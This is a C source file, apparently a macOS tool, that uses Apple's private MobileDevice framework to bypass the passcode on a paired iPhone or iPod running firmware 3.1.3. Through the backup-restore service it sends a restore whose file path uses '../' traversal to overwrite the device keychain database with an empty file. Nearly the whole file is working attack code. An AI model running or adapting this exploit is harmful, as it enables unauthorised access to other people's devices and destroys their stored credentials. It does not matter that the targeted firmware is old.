#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <CoreFoundation/CoreFoundation.h>

#include "log_utils.h"

t_log_event infoLogEvent = INFO;
t_log_event restoreLogEvent = RESTORE;
t_log_event errorLogEvent = ERROR;

#include "sha.h"
#include "MobileDevice.h"
#include "core_foundation_utils.h"
#include "mobile_device_communication.h"
#include "mobile_device_restore.h"

/*   
    ========== loadAndLinkAMFramworks() ========== 
    Loads and dynamically links our required methods from MobileDevice.framework to this program
*/
void *mobile_device_framework;
void loadAndLinkAMFramworks() {
    mobile_device_framework = dlopen("/System/Library/PrivateFrameworks/MobileDevice.framework/MobileDevice", RTLD_NOW);

    AMDeviceNotificationSubscribe = dlsym(mobile_device_framework, "AMDeviceNotificationSubscribe");
	AMDeviceConnect = dlsym(mobile_device_framework, "AMDeviceConnect");
	AMDeviceIsPaired = dlsym(mobile_device_framework, "AMDeviceIsPaired");
	AMDeviceValidatePairing = dlsym(mobile_device_framework, "AMDeviceValidatePairing");
	AMDeviceStartSession = dlsym(mobile_device_framework, "AMDeviceStartSession");
    AMDeviceCopyValue = dlsym(mobile_device_framework, "AMDeviceCopyValue");
    AMDeviceStartService = dlsym(mobile_device_framework, "AMDeviceStartService");
    AMDeviceCopyDeviceIdentifier = dlsym(mobile_device_framework, "AMDeviceCopyDeviceIdentifier");
}

// Relevant info of our current device
static am_device *device;
CFStringRef deviceInfo;


//==== Device Notification Callback ====
/* This method will perform the passcode bypass once a compatible iPod/iPhone is detected. */
static void device_notification_callback(am_device_notification_callback_info *info, void *foo) 
{	
	if (info->msg != ADNCI_MSG_CONNECTED) { 
        log_string_to_stdout(infoLogEvent, "Device disconnected!");
        return; 
    }

    device = info->dev;

	if (AMDeviceConnect(device)) { 
        log_string_to_stdout(errorLogEvent,"Connection Failed during AMDeviceConnect!");
        return; 
    }

	if (!AMDeviceIsPaired(device)) { 
        log_string_to_stdout(errorLogEvent,"Device is not paired!"); 
        return; 
    }

	if (AMDeviceValidatePairing(device)) { 
        log_string_to_stdout(errorLogEvent,"Device pairing validation failed!"); 
        return; 
    }

	if (AMDeviceStartSession(device)) { 
        log_string_to_stdout(errorLogEvent, "Failed to start device session!"); 
        return; 
    }

    deviceInfo = cf_create_string_with_format(
        CFSTR("Device connected --> Model: %@ Firmware version: %@"),
        AMDeviceCopyValue(device, 0, CFSTR("ProductType")),
        AMDeviceCopyValue(device, 0, CFSTR("ProductVersion")));

    log_cf_string_to_stdout(infoLogEvent, deviceInfo);

    if(CFStringFind(deviceInfo, CFSTR("3.1.3"), kCFCompareCaseInsensitive).location != kCFNotFound) {
        CFDataRef empty_data = CFDataCreateWithBytesNoCopy(NULL, (const uint8_t *)"", 0, kCFAllocatorNull);

        service_conn_t service_connection;
        AMDeviceStartService(device, AMSVC_BACKUP, &service_connection, NULL);
        log_cf_string_to_stdout(restoreLogEvent, mobile_device_receive_msg(service_connection));

        mobile_device_send_msg(service_connection, cf_create_array_m(CFSTR("DLMessageVersionExchange"), CFSTR("DLVersionsOk")));
        log_cf_string_to_stdout(restoreLogEvent, mobile_device_receive_msg(service_connection));

        CFMutableDictionaryRef files = cf_create_dict_m();
        CFMutableDictionaryRef keychain_file_structure = mobile_device_add_restore_file(
            files, 
            empty_data, 
            CFSTR("HomeDomain"), 
            CFSTR("Library/Preferences/SystemConfiguration/../../../../../var/Keychains/keychain-2.db"),
            0, 0, 0600
        );

        log_string_to_stdout(infoLogEvent,"Initiating Restore");

        CFStringRef restore_info = CFStringCreateWithFormat(NULL, NULL, CFSTR("Starting Restore with files: %@"), files);
        log_cf_string_to_stdout(restoreLogEvent, restore_info);

        CFStringRef deviceId = AMDeviceCopyDeviceIdentifier(device);
        mobile_device_initiate_restore(deviceId, service_connection, files);
        log_cf_string_to_stdout(restoreLogEvent, mobile_device_receive_msg(service_connection));
        sleep(1); //Wait 1 second for com.apple.mobilebackup to respond on the device

        mobile_device_send_file(service_connection, keychain_file_structure);
        log_cf_string_to_stdout(restoreLogEvent, mobile_device_receive_msg(service_connection));

        close(service_connection);

        log_string_to_stdout(infoLogEvent,"Process completed!");
        exit(0);

    } else {
        log_string_to_stdout(errorLogEvent,"Device not supported!");
    }

    CFRelease(deviceInfo);
}


int main(void) {
    loadAndLinkAMFramworks();

    am_device_notification *notif;
	AMDeviceNotificationSubscribe(device_notification_callback, 0, 0, NULL, &notif);

    CFRunLoopRun();
    return 0;
}